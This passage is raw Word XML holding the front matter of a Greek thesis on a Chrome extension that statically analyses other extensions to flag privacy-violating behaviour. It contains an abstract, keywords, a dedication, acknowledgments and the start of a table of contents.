    </w:p>
    <w:p w14:paraId="61576F63" w14:textId="6480B9A0" w:rsidR="00815487" w:rsidRPr="00897C0A" w:rsidRDefault="00815487" w:rsidP="00815487">
      <w:pPr>
        <w:ind w:left="1701" w:hanging="1701"/>
      </w:pPr>
      <w:r w:rsidRPr="00897C0A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>KEYWORDS</w:t>
      </w:r>
      <w:r w:rsidRPr="00897C0A">
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00C86CEE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00726C29">
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="00B361E8">
        <w:t>alicious</w:t>
      </w:r>
      <w:r w:rsidR="00726C29">
        <w:t xml:space="preserve"> Extensions, C</w:t>
      </w:r>
      <w:r w:rsidR="00B361E8">
        <w:t xml:space="preserve">hrome </w:t>
      </w:r>
      <w:r w:rsidR="00726C29">
        <w:t>Browser</w:t>
      </w:r>
      <w:r w:rsidR="00B361E8">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00726C29">
        <w:t xml:space="preserve"> Native Messaging H</w:t>
      </w:r>
      <w:r w:rsidR="00B361E8">
        <w:t>ost.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72592186" w14:textId="77777777" w:rsidR="00D41290" w:rsidRPr="005B5B30" w:rsidRDefault="00815487" w:rsidP="005C6CE3">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00472A24">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
      <w:r w:rsidR="00D41290" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ΠΕΡΙΛΗΨΗ</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:p w14:paraId="6067F57C" w14:textId="77777777" w:rsidR="00E561B9" w:rsidRPr="005B5B30" w:rsidRDefault="00E561B9" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F416DCB" w14:textId="2DC0482D" w:rsidR="00DC33D2" w:rsidRPr="005B5B30" w:rsidRDefault="004828C6" w:rsidP="00DC33D2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Σήμερα </w:t>
      </w:r>
      <w:r w:rsidR="00DC33D2" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>η χρήση επεκτάσεων είναι διαδεδομένη στους χρήστες όλων των μεγάλων</w:t>
      </w:r>
      <w:r w:rsidR="00DC33D2" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">μηχανών αναζήτησης όπως είναι ο </w:t>
      </w:r>
      <w:r w:rsidR="00DC33D2">
        <w:t>Chrome</w:t>
      </w:r>
      <w:r w:rsidR="00DC33D2" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00491F06" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Παρατηρείται επίσης μεγάλη αύξηση του πλήθους των προσωπικών δεδομένων τα οποία διατηρούν οι μηχανές αναζήτησης και ως αποτέλεσμα γίνονται στόχος </w:t>
      </w:r>
      <w:r w:rsidR="003D04EB">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">επιτιθέμενων </w:t>
      </w:r>
      <w:r w:rsidR="003D04EB" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>οι οποίοι εκμεταλλε</w:t>
      </w:r>
      <w:r w:rsidR="003D04EB">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ύονται</w:t>
      </w:r>
      <w:r w:rsidR="00491F06" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> τον τρόπο λειτουργίας </w:t>
      </w:r>
      <w:r w:rsidR="00B54812" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">των επεκτάσεων </w:t>
      </w:r>
      <w:r w:rsidR="003D04EB">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ώστε</w:t>
      </w:r>
      <w:r w:rsidR="00B54812" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> να συγκεντρώσουν διάφορες πληροφορίες από τον </w:t>
      </w:r>
      <w:r w:rsidR="003D04EB">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">ανυποψίαστο </w:t>
      </w:r>
      <w:r w:rsidR="00B54812" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>χρήστη</w:t>
      </w:r>
      <w:r w:rsidR="004C3260" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> χωρίς </w:t>
      </w:r>
      <w:r w:rsidR="003D04EB">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>την συγκατάθεσή του</w:t>
      </w:r>
      <w:r w:rsidR="00491F06" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1DACC2" w14:textId="12856E73" w:rsidR="004C3260" w:rsidRPr="005B5B30" w:rsidRDefault="00873692" w:rsidP="00DC33D2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Στόχος </w:t>
      </w:r>
      <w:r w:rsidR="007837DC" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">της πτυχιακής εργασίας είναι να δημιουργήσουμε μια επέκταση </w:t>
      </w:r>
      <w:r w:rsidR="002173CA">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>η</w:t>
      </w:r>
      <w:r w:rsidR="007837DC" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> οποία </w:t>
      </w:r>
      <w:r w:rsidR="002173CA" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">παρακολουθεί τη λειτουργικότητα μιας επέκτασης για τον εντοπισμό ύποπτων ενεργειών που ενδέχεται να παραβιάζουν το απόρρητο του χρήστη. Έχουμε εφαρμόσει την προσέγγισή μας ως </w:t>
      </w:r>
      <w:r w:rsidR="002173CA">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">μια </w:t>
      </w:r>
      <w:r w:rsidR="002173CA" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">επέκταση </w:t>
      </w:r>
      <w:r w:rsidR="002173CA">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">του </w:t>
      </w:r>
      <w:r w:rsidR="002173CA">
        <w:t>Chrome</w:t>
      </w:r>
      <w:r w:rsidR="002173CA" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7979682A" w14:textId="77777777" w:rsidR="00B66BCA" w:rsidRPr="005B5B30" w:rsidRDefault="00B66BCA" w:rsidP="00DC33D2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Ο τρόπος με τον οποίο λειτουργεί η επέκταση είναι αρχικά να συνδέεται με έναν </w:t>
      </w:r>
      <w:r>
        <w:t>Native</w:t>
      </w:r>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Messaging</w:t>
      </w:r>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Host</w:t>
      </w:r>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>, ο οποίος στέλνει την πληροφορία για τη ταυτότητα της επέκτασης που έχει επιλέξει ο χρήστης στην εφαρμογή. Η εφαρμογή με τη σειρά της θα κατεβάσει τον πηγαίο κώδικα της επέκτασης και θα εκτελέσει στατική ανάλυση πάνω στον κώδικα αυτό.</w:t>
      </w:r>
      <w:r w:rsidR="00750500" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Κάθε φορά που εντοπιστεί κάποια ύποπτη ενέργεια θα ενημερώσει τον χρήστη με αντίστοιχο προειδοποιητικό μήνυμα αλλά και το αρχείο στο οποίο εντοπίστηκε η ενέργεια.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419DFD5B" w14:textId="77777777" w:rsidR="00F740A8" w:rsidRPr="005B5B30" w:rsidRDefault="00F740A8" w:rsidP="00DC33D2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="650D6DB0" w14:textId="77777777" w:rsidR="00947FB8" w:rsidRPr="005B5B30" w:rsidRDefault="00947FB8" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F35ECC7" w14:textId="77777777" w:rsidR="00947FB8" w:rsidRPr="005B5B30" w:rsidRDefault="00947FB8" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62C96116" w14:textId="77777777" w:rsidR="00947FB8" w:rsidRPr="005B5B30" w:rsidRDefault="00947FB8" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="629E7E2E" w14:textId="77777777" w:rsidR="00947FB8" w:rsidRPr="005B5B30" w:rsidRDefault="00947FB8" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="755B87D8" w14:textId="77777777" w:rsidR="00E507E5" w:rsidRPr="005B5B30" w:rsidRDefault="00E507E5" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53776134" w14:textId="77777777" w:rsidR="00E507E5" w:rsidRPr="005B5B30" w:rsidRDefault="00E507E5" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25D8EBEC" w14:textId="77777777" w:rsidR="00E507E5" w:rsidRPr="005B5B30" w:rsidRDefault="00E507E5" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DDF8305" w14:textId="77777777" w:rsidR="00947FB8" w:rsidRPr="005B5B30" w:rsidRDefault="00947FB8" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52B218D4" w14:textId="77777777" w:rsidR="00616FC8" w:rsidRPr="005B5B30" w:rsidRDefault="00616FC8" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="156F57D5" w14:textId="7A11FC25" w:rsidR="00D41290" w:rsidRPr="00A84D01" w:rsidRDefault="00D41290" w:rsidP="009747DC">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΘΕΜΑΤΙΚΗ ΠΕΡΙΟΧΗ</w:t>
      </w:r>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="00BE4A26" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Ανάλυση Προγράμματος, </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">Στατική </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>Α</w:t>
      </w:r>
      <w:r w:rsidR="00513FE0" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>νάλυση</w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>, Κακόβουλο Λογισμικό</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B893F8C" w14:textId="710355FE" w:rsidR="00D41290" w:rsidRPr="00314771" w:rsidRDefault="00D41290" w:rsidP="00A97F2E">
      <w:pPr>
        <w:ind w:left="2127" w:hanging="2127"/>
      </w:pPr>
      <w:r w:rsidRPr="00080625">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ΛΕΞΕΙΣ ΚΛΕΙ</w:t>
      </w:r>
      <w:r w:rsidR="00916998">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Δ</w:t>
      </w:r>
      <w:r w:rsidRPr="00080625">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ΙΑ</w:t>
      </w:r>
      <w:r w:rsidRPr="00080625">
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:rPr>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>Κ</w:t>
      </w:r>
      <w:r w:rsidR="00F11ACC">
        <w:t>ακόβ</w:t>
      </w:r>
      <w:r w:rsidR="00314771">
        <w:t>ουλες επεκτάσεις</w:t>
      </w:r>
      <w:r w:rsidR="00314771" w:rsidRPr="00314771">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00314771">
        <w:t>hrome</w:t>
      </w:r>
      <w:r w:rsidR="00314771" w:rsidRPr="00314771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:t>Browser</w:t>
      </w:r>
      <w:r w:rsidR="00314771" w:rsidRPr="00314771">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="00314771">
        <w:t>ative</w:t>
      </w:r>
      <w:r w:rsidR="00314771" w:rsidRPr="00314771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="00314771">
        <w:t>essaging</w:t>
      </w:r>
      <w:r w:rsidR="00314771" w:rsidRPr="00314771">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A84D01">
        <w:t>H</w:t>
      </w:r>
      <w:r w:rsidR="00314771">
        <w:t>ost</w:t>
      </w:r>
      <w:r w:rsidR="00314771" w:rsidRPr="00314771">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B57CE68" w14:textId="77777777" w:rsidR="002630A8" w:rsidRPr="00210431" w:rsidRDefault="002630A8" w:rsidP="00815487"/>
    <w:p w14:paraId="429618AA" w14:textId="77777777" w:rsidR="00961AD7" w:rsidRPr="002F71E3" w:rsidRDefault="001D7A35" w:rsidP="00E507E5">
      <w:pPr>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00210431">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="133D0408" w14:textId="77777777" w:rsidR="00C31E64" w:rsidRDefault="00C31E64" w:rsidP="009747DC"/>
    <w:p w14:paraId="26D06B51" w14:textId="77777777" w:rsidR="006B7164" w:rsidRDefault="006B7164" w:rsidP="006B7164">
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24B1D60C" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="006B7164" w:rsidRDefault="006B7164" w:rsidP="006B7164"/>
    <w:p w14:paraId="556D591C" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="006B7164" w:rsidRDefault="006B7164" w:rsidP="006B7164"/>
    <w:p w14:paraId="5F005D56" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="006B7164" w:rsidRDefault="006B7164" w:rsidP="006B7164"/>
    <w:p w14:paraId="2C09A81A" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="006B7164" w:rsidRDefault="006B7164" w:rsidP="006B7164"/>
    <w:p w14:paraId="0982AA97" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="006B7164" w:rsidRDefault="006B7164" w:rsidP="006B7164"/>
    <w:p w14:paraId="74D71EB8" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="006B7164" w:rsidRDefault="006B7164" w:rsidP="006B7164">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006B7164">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>To my parents.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC27E10" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="007B27E6" w:rsidRDefault="006B7164" w:rsidP="006B7164">
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6F6B2A84" w14:textId="77777777" w:rsidR="006B7164" w:rsidRPr="007B27E6" w:rsidRDefault="006B7164" w:rsidP="006B7164">
      <w:pPr>
        <w:jc w:val="right"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D4AE9C8" w14:textId="77777777" w:rsidR="00A34316" w:rsidRPr="007B27E6" w:rsidRDefault="0093569E" w:rsidP="00040BFD">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B27E6">
        <w:br w:type="page"/>
      </w:r>
      <w:r w:rsidR="00724A19">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>AKNOWLEDGMENTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF7AA26" w14:textId="77777777" w:rsidR="00A34316" w:rsidRPr="007B27E6" w:rsidRDefault="00A34316" w:rsidP="00A34316">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61473D75" w14:textId="77777777" w:rsidR="00A34316" w:rsidRPr="006F1E27" w:rsidRDefault="006F1E27" w:rsidP="00897C0A">
      <w:pPr>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve">I would like to thank my supervisor, Mr. </w:t>
      </w:r>
      <w:r w:rsidR="007B27E6">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="el-GR"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="el-GR"/>
        </w:rPr>
        <w:t>itropoul</w:t>
      </w:r>
      <w:r w:rsidR="000A3438">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="el-GR"/>
        </w:rPr>
        <w:t>os, for his cooperation and valuable contribution to complete this thesis.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="050DA08D" w14:textId="77777777" w:rsidR="00C31E64" w:rsidRPr="006F1E27" w:rsidRDefault="00C31E64" w:rsidP="00734DEC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76D4FC0A" w14:textId="77777777" w:rsidR="00685974" w:rsidRPr="006F1E27" w:rsidRDefault="00685974" w:rsidP="009747DC"/>
    <w:p w14:paraId="63D5FC06" w14:textId="77777777" w:rsidR="00CD6855" w:rsidRPr="00724A19" w:rsidRDefault="0093569E" w:rsidP="00314743">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006F1E27">
        <w:br w:type="page"/>
      </w:r>
      <w:r w:rsidR="00724A19">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="el-GR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>CONTENTS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23325DB4" w14:textId="77777777" w:rsidR="009E02A4" w:rsidRPr="00CC35AD" w:rsidRDefault="009E02A4" w:rsidP="00094782">
      <w:pPr>
        <w:spacing w:before="0" w:after="240" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="25" w:name="_Toc219883672"/>
    <w:p w14:paraId="28552B49" w14:textId="11FF81B9" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00194DEF">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00642218">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00642218">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00642218">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:b w:val="0"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc523071490" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>PREFACE</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071490 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="666A49F6" w14:textId="34B5420D" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071491" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>1.</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>INTRODUCTION</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
